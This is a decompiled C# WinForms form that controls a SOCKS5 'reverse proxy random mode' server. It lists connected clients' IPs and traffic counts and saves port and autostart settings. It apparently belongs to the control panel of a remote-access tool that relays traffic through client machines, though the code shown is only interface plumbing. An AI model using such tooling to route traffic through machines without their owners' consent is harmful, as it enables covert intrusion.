using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using MaterialSkin.Controls;
using Newtonsoft.Json;
using Server.Connectings;
using Server.Data;
using Server.Helper;
using Server.Helper.Sock5;

namespace Server.Forms
{
	// Token: 0x020000A2 RID: 162
	public partial class FormReverseProxyR : FormMaterial
	{
		// Token: 0x0600047B RID: 1147 RVA: 0x000391F1 File Offset: 0x000373F1
		public FormReverseProxyR()
		{
			this.InitializeComponent();
			base.FormClosing += this.Closing1;
		}

		// Token: 0x0600047C RID: 1148 RVA: 0x00039224 File Offset: 0x00037424
		private void NewItem(Client client)
		{
			try
			{
				client.Tag = new DataGridViewRow();
				((DataGridViewRow)client.Tag).Tag = client;
				((DataGridViewRow)client.Tag).Cells.Add(new DataGridViewTextBoxCell
				{
					Value = client.ClientReverse.IP
				});
				((DataGridViewRow)client.Tag).Cells.Add(new DataGridViewTextBoxCell
				{
					Value = client.IPAddress
				});
				((DataGridViewRow)client.Tag).Cells.Add(new DataGridViewTextBoxCell
				{
					Value = client.Port
				});
				((DataGridViewRow)client.Tag).Cells.Add(new DataGridViewTextBoxCell
				{
					Value = Methods.BytesToString(client.Recives)
				});
				((DataGridViewRow)client.Tag).Cells.Add(new DataGridViewTextBoxCell
				{
					Value = Methods.BytesToString(client.Sents)
				});
				base.Invoke(new MethodInvoker(delegate()
				{
					this.GridIps.Rows.Add((DataGridViewRow)client.Tag);
				}));
			}
			catch
			{
			}
		}

		// Token: 0x0600047D RID: 1149 RVA: 0x000393A8 File Offset: 0x000375A8
		private void RemoveItem(Client client)
		{
			if (client.Tag != null)
			{
				try
				{
					base.Invoke(new MethodInvoker(delegate()
					{
						this.GridIps.Rows.Remove((DataGridViewRow)client.Tag);
					}));
					((DataGridViewRow)client.Tag).Dispose();
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600047E RID: 1150 RVA: 0x00039414 File Offset: 0x00037614
		private void EditItem(Client client, long sent, long recive)
		{
			if (client.Tag != null)
			{
				try
				{
					((DataGridViewRow)client.Tag).Cells[0].Value = client.ClientReverse.IP;
					((DataGridViewRow)client.Tag).Cells[1].Value = client.IPAddress;
					((DataGridViewRow)client.Tag).Cells[2].Value = client.Port;
					((DataGridViewRow)client.Tag).Cells[3].Value = Methods.BytesToString(client.Recives);
					((DataGridViewRow)client.Tag).Cells[4].Value = Methods.BytesToString(client.Sents);
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600047F RID: 1151 RVA: 0x000394F8 File Offset: 0x000376F8
		private void RemoteDesktop_Load(object sender, EventArgs e)
		{
			if (!Directory.Exists("local"))
			{
				Directory.CreateDirectory("local");
			}
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			if (File.Exists("local\\ReverseProxyR.json"))
			{
				ReverseProxyR reverseProxyR = JsonConvert.DeserializeObject<ReverseProxyR>(File.ReadAllText("local\\ReverseProxyR.json"));
				this.rjTextBox1.Texts = reverseProxyR.Port;
				this.materialSwitch2.Checked = reverseProxyR.AutoStart;
				if (reverseProxyR.AutoStart)
				{
					try
					{
						Convert.ToInt32(this.rjTextBox1.Texts);
					}
					catch
					{
						return;
					}
					this.Server.Start(Convert.ToInt32(this.rjTextBox1.Texts));
					this.rjButton1.Text = "Stop";
					this.work = true;
				}
			}
			this.timer1.Start();
			this.Server.ConnectEvent += this.NewItem;
			this.Server.DisconnectEvent += this.RemoveItem;
			this.Server.ResponceEvent += this.EditItem;
		}

		// Token: 0x06000480 RID: 1152 RVA: 0x00039630 File Offset: 0x00037830
		private void ChangeScheme(object sender)
		{
			this.GridIps.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
			this.GridIps.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.GridIps.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
			this.GridIps.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.rjTextBox1.BorderColor = FormMaterial.PrimaryColor;
			this.rjButton1.BackColor = FormMaterial.PrimaryColor;
			this.rjButton2.BackColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x06000481 RID: 1153 RVA: 0x000396C4 File Offset: 0x000378C4
		private void Save()
		{
			File.WriteAllText("local\\ReverseProxyR.json", JsonConvert.SerializeObject(new ReverseProxyR
			{
				Port = this.rjTextBox1.Texts,
				AutoStart = this.materialSwitch2.Checked
			}, Formatting.Indented));
		}

		// Token: 0x06000482 RID: 1154 RVA: 0x0003970C File Offset: 0x0003790C
		private void rjButton1_Click(object sender, EventArgs e)
		{
			this.Save();
			if (this.rjButton1.Text == "Start")
			{
				try
				{
					Convert.ToInt32(this.rjTextBox1.Texts);
				}
				catch
				{
					return;
				}
				this.Server.Start(Convert.ToInt32(this.rjTextBox1.Texts));
				this.rjButton1.Text = "Stop";
				return;
			}
			this.Server.Stop();
			this.GridIps.Rows.Clear();
			this.rjButton1.Text = "Start";
		}

		// Token: 0x06000483 RID: 1155 RVA: 0x000397B4 File Offset: 0x000379B4
		private void Closing1(object sender, FormClosingEventArgs e)
		{
			this.work = false;
			Clients[] array = this.Server.ClientReverse.ToArray();
			for (int i = 0; i < array.Length; i++)
			{
				Clients client = array[i];
				Task.Run(delegate()
				{
					client.Disconnect();
				});
			}
			this.Server.ClientReverse.Clear();
			this.GridIps.Rows.Clear();
			this.timer1.Stop();
			if (this.rjButton1.Text == "Stop")
			{
				this.rjButton1.Text = "Start";
				this.Server.Stop();
			}
			this.Save();
			e.Cancel = true;
			base.Hide();
		}

		// Token: 0x06000484 RID: 1156 RVA: 0x00039876 File Offset: 0x00037A76
		private void rjButton2_Click(object sender, EventArgs e)
		{
			base.Hide();
		}

		// Token: 0x06000485 RID: 1157 RVA: 0x0003987E File Offset: 0x00037A7E
		private void timer1_Tick_1(object sender, EventArgs e)
		{
			this.Text = string.Format("Reverse Proxy Random mode [{0}]", this.Server.ClientReverse.Count);
		}

		// Token: 0x06000486 RID: 1158 RVA: 0x000398A5 File Offset: 0x00037AA5
		private void materialSwitch2_CheckedChanged(object sender, EventArgs e)
		{
			this.Save();
		}

		// Token: 0x040002E0 RID: 736
		public bool work;

		// Token: 0x040002E1 RID: 737
		public Server.Helper.Sock5.Server Server = new Server.Helper.Sock5.Server(new List<Clients>());
	}
}
